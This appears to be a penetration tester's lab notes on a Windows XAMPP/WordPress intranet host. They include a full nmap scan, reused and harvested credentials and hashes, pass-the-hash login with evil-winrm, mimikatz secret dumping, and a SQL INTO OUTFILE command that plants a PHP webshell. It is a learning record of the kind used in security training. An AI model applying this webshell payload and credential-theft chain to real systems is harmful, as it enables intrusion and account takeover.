```
Nmap scan report for 172.16.201.7
Host is up (0.015s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-generator: WordPress 6.0.3
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.201.7/wordpress/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.201.7/wordpress/
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-generator: WordPress 6.0.3
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=INTRANET.relia.com
| Not valid before: 2025-02-06T19:32:09
|_Not valid after:  2025-08-08T19:32:09
|_ssl-date: 2025-02-07T21:25:36+00:00; -4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: INTRANET
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: INTRANET.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-02-07T21:24:56+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:be:10 (VMware)
| smb2-time: 
|   date: 2025-02-07T21:24:55
|_  start_date: N/A
|_clock-skew: mean: -4s, deviation: 0s, median: -4s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT      ADDRESS
1   15.20 ms 172.16.201.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 323.67 seconds
```

- Got shell using michels creds
- Found passwords.txt file in C:\xampp
	- MySQL (phpMyAdmin)
		- root:NOPASSWORD
	- Mercury:
		- newuser:wampp
	- Webdav:
		- xampp-dav-unsecure:ppmax2011
- Discovered phpmyadmin at localhost/phpmyadmin
	- Discovered credentials under wp_users
		- ```admin:$P$B31Lzkqy3y9lp7aDU6sYckSiHRmUaE0```
			- Email: wp-admin@relia.com
- Able to login using evil-winrm and administrator hash
- Got andreas password with mimi
# Loot:
- Admin hash: 8b4547a5116dd13e6e206d1286a06b28
- andrea:PasswordPassword_6
# Courses of Action:
- ~~There is a sql server running on port 3306 that we should access with a proxy~~
- Upload a reverse shell via phpmyadmin
- Used this tutorial to get a webshell via phpmyadmin that is running as root (https://benheater.com/proving-grounds-squid/)
	- had to adjust php webshell to: 
	```
	SELECT "<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>" INTO OUTFILE 'C:/xampp/htdocs/webshell.php';
	```
- Got full reverse shell using this payload: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.phpcd
- Got andreas password using lsadump::secrets